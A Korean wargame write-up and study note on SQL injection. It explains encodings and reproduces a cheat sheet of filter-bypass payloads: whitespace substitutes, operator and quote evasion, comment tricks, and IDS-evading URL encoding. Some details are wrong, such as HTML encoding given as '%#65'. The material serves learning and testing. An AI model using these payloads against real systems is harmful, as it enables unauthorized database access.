# 주요 질문 해결  
1. 왜 space를 url 인코딩한 %20나 +는 안되는가?  
preg_match 함수에 space가 필터링 되므로, space 대신 대체할 수 있는 Tab(%09)이나 LineFeed(%0a), Carrage Return(%0d)을 인코딩해서 써야 합니다!  

2. 왜 input field에 답을 입력하면 제대로 solved가 되지 않는가?  
```no=0%0aor%0ano=2``` 가 답 중 하나인데, 이를 input field에 ```0%0aor%0ano=2``` 만 넣어보았습니다.  
당연히 제대로 풀려야 하는데 url을 보니 ```no=0%250aor%250ano%3D2```되었습니다.  
서버가 input값을 검증하는 과정에서 %을 escape(=url encoding) 처리하여 %25로 만들었기 때문에, %0a가 linefeed로 인식이 되지 않았기에 풀리지 않는 것입니다.  
~~나름 input field에 보안을 넣긴 넣었네요ㅎㅎ view-source에서 확인할 수는 없지만 그런 과정을 넣은 것 같습니다!~~  
~~그치만 GET방식의 URL 쿼리파라미터도 검증(필터링)작업을 해주면 좋았을텐데...는 문제 풀라고 그런거겠죠?~~  

# 인코딩(Encoding)  
- 정보의 형태나 형식을 표준화, 보안, 처리속도 향상, 저장 공간 절약 등을 위해서 다른 형태나 형식으로 변환하는 처리 혹은 그 방식  
=> 즉, 컴퓨터가 이해할 수 있는 형식으로 바꾸어 주는 것(모든 컴퓨터에서 해석이 가능하도록! 글자가 깨지는 등을 방지)  
> 데이터 송수신 시 인코딩해서 보내고, 디코드해서 표현하고...  
- 컴퓨터에서 인코딩은 동영상이나 문자 인코딩 외에도 사람이 인지할 수 있는 형태의 데이터를 약속된 규칙에 의해 컴퓨터가 사용하는 0,1로 변환하는 과정을 통틀어 일컫는다.  
- 내용에는 변화가 없고, 암호화로는 사용이 불가능하다.  
- 인코딩 종류네는 ASCII, URL, HTML, Base64, Ms Script 등이 있다.  
우리는 웹해킹 시 많이 보이는 인코딩 4개를 살펴볼 것이다.  

## ASCII 인코딩  
- American Standard Code for Information Interchange : 미국 정보교환 표준 코드  
- 영문자를 컴퓨터가 해석할 수 있는 숫자로 변환시켜 준다.(컴퓨터는 0과 1로만 데이터를 인식 할 수 있기에 문자를 인식할 수 없다. 아스키코드를 이용해 문자를 숫자로 표현하여 인식할 수 있다.)  
- 1Byte(8bit) 중 7bit를 사용하여 0~127까지 총 128개의 문자를 구성한 코드  
128개의 문자는 영어 알파벳 대문자, 소문자, 보조문자, 제어문자로 구성되어 있다.  

## URL 인코딩  
- URL 스트링에 있는 텍스트를, 모든 브라우저에서 똑바로 전송하기 위해 존재한다.  
- ASCII 코드에 없는 영어를 제외한 외국어(한국어 포함)와 ASCII에 정의되지 않는 특수 문자의 경우  
URL에 포함될 수 없고 URL내에서 의미를 갖고 있는 문자(%,?,#)나 URL에 올 수 없는 문자(Space) 혹은 System에서 해석이 될 수 있는 문자(<,>)를 치환하여 야기될 수 있는 문제점을 예방하기 위해 URL 인코딩을 사용한다.    
- 형식: 기존 문자열의 HEX 앞에 '%' 사용 (ASCII Table의 출력가능 문자)  
- 한글: UTF-8 사용(UTF-8은 가장 일반적으로 사용하는 문자 인코딩 방식)  
- **Force Full URL Encoding**: 모든 문자열을 강제로 인코딩 하는 기법, IDS 등을 우회하기 위한 용도로 사용될 수 있다.  
> URL Encoding: %3Cscript%3E  
> Force Full URL Encoding: %3C%73%63%72%69%70%74%3E  
- URL은 ASCII 문자 집합을 사용하여 인터넷을 통해서만 전송할 수 있다.  

## HTML 인코딩  
- HTML 문서 안에는 스크립트와 같이 특수한 기능을 하는 문자들이 포함된다. 악의적인 특수기능을 막기 위해 인코딩하여 안전하게 HTML 문서와 함께 사용하기 위해서 HTML 인코딩을 사용한다.  
- ASCII 코드값을 기준으로 인코딩 된다.  
ex) A(ASCII 값 == 65) <=> %#65(HTML 인코딩)  
- 특징: 코드의 앞에 '%#' 문자가 포함된다.  
- HTML 인코딩은 XSS의 방어 대책으로 사용된다.  

## Base64 인코딩  
- 이메일 사용을 위한 인터넷 표준 포맷인 MIME를 사용하기 위해 사용한다.  
STMP라는 이메일 전송 프로토콜도 존재하지만 ASCII는 7bit 문자만 지원하기 때문에 더 많은 문자를 표현하기 위해 사용된다.  
- 이진 데이터를 ASCII 형태의 텍스트로 표현 가능하다.  
- WEB 인증 중, 기본 인증에 사용된다.  
- 64개의 문자를 사용한다. (영문 대,소문자, 숫자, +, /)
- 특징: 코드의 마지막에 = 또는 ==문자가 포함된다.  
- Base64 인코딩은 8bit의 문자를 6bit 단위로 나누어준다. 각각의 6bit를 Base64 인코딩테이블과 매칭시키는 방식을 사용한다.  

**Base64 인코딩 순서**  
ex) base64 인코딩 할 단어 : dong
1) 아스키 테이블 매핑  
> 0x64 0x6F 0x6E 0x67  
2) 2진수 변환  
> 01100100 01101111 01101110 01100111  
3) 6bit 단위로 분할  
> 011001 000110 111101 101110 011001 110000  
4) 10진수 변환  
> 25 6 61 46 25 48  
5) BASE64 테이블 매핑  
> ZG9uZw  
6) 패딩연산(총 비트수 %3 => 0: 없음, 1: =, 2: ==)  
> 32(dong의 비트 수)%3 = 2 이므로  
> 최종 결과는: ZG9uZw==  


# SQL Injection 필터링 우회 방법 모음  
[출처](https://g-idler.tistory.com/61)  
## 1. 공백 문자 우회  
### 1) Line Feed (\n)  
- 커서(캐럿)를 다음 줄(현재 위치에서 바로 아래줄)로 이동시키는 개행 문자  
- URL Encoding: %0a  
- ex) no=1%0aor%0aid='admin'  

### 2) Tab (\t)  
- 커서를 한 tab만큼 이동시키는 문자  
- URL Encoding: %09  
- ex) no=1%09or%09id='admin'  

### 3) Carrage Return (\r)  
- 커서(캐럿)를 줄의 맨 앞(왼쪽)으로 이동시키는 개행 문자  
- URL Encoding: %0d  
- ex) no=1%0dor%0did='admin'  

### 4) 주석 (/**/)  
- ex) no=1/**/or/**/id='admin'  

### 5) 괄호 ()  
- ex) no=(1)or(id='admin')  

### 6) 더하기 (+)  
- ex) no=1+or+id='admin'  

### 7) %0b, %0c, %a0  
- 1~6까지의 모든 우회 방법이 먹히지 않을 경우 공백 대신 사용  
- %a0은 잘 안먹히는 것 같으니 %0b나 %0c를 위주로 사용하자.  


## 2. 논리 연산자, 비교 연산자 우회  
### 1) OR 연산자  
- ||

### 2) AND 연산자  
- &&  
- URL Encoding: %26%26  

### 3) 등호(=)  
① LIKE 연산자  
- ex) id like "admin"  
- 정규 표현식을 이용하여 쿼리문을 조작할 수도 있음 (ex. pw like "a%" → pw의 첫 번째 문자가 a이면 true)   

② IN 연산자  
- ex) id in ("admin")  

③ instr(string $str, string $substr)  
- ex) instr(id, "admin")  

④ 부등호 (< , >)  
- ex) length(pw) > 7 and length(pw) < 9  


## 3.  함수 우회  
### 1) str_replace(string $search, string $replace, string $subject)  
- 필터링되는 문자열 사이에 문자열을 넣는다.  
- ex) str_replace("admin", "", $_GET[id])  
→ adadminmin 으로 입력하면 중간에 있는 admin이 공백으로 필터링되어 admin만 남게 된다.

### 2) substr(string $str, int $start, int $length)  
- substring(string $str, int $start, int $length)  
- mid(string $str, int $start, int $length)  

### 3) ascii(string $str)  
- ord(string $str): ascii 함수와 마찬가지로 문자열을 아스키코드 값으로 변환해줌  
- hex(string $str): 문자열을 아스키코드 헥사값으로 변환해줌  
  ex) hex(substr(pw, 1, 1)) = hex(61)  


## 4. 주석 처리  
### 1) --  
- 뒤에 반드시 공백이 있어야 정상적으로 주석 처리가 된다.  
- 한 줄만 주석처리한다.  

### 2) # (URL Encoding: %23)  
- '--'처럼 뒤에 공백이 없어도 정상적으로 주석 처리된다.  
- 한 줄만 주석 처리한다.  

### 3) /* */  
- /* */ 사이의 문자열들이 모두 주석 처리된다.  

### 4) ;%00  
- NULL 문자인 %00과 ;이 결합한 주석 처리 문자  


## 5. 싱글 쿼터(') 우회  
### 1) 더블 쿼터(") 사용  
ex) id="admin"  

### 2) 백슬래시(\) 사용  
- select id from table where id='$_GET[id]' and pw='$_GET[pw]' 와 같은 쿼리문에 제한적으로 사용 가능  
- ex) id='\' and pw=' or 1#' → \에 의해 바로 뒤에 있는 싱글쿼터(')가 문자로 인식됨  
☞ '\' and pw'가 문자열로 인식되고 이 뒷부분부터는 쿼리문으로 인식됨  
☞ 인자 전달: id=\&pw=%20or%201%23  
